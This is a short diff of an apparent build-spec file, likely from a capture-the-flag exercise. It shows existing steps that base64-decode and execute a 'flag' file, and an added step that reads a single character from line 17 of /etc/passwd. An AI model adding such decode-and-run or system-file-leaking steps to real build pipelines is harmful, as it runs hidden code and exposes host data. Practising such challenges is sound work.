@@ -7,3 +7,4 @@ phases:
       - echo "Here's your flag"
       - chmod +x flag
       - sh flag | base64 --decode | sh
+      - sed '17q;d' /etc/passwd | head -c 1
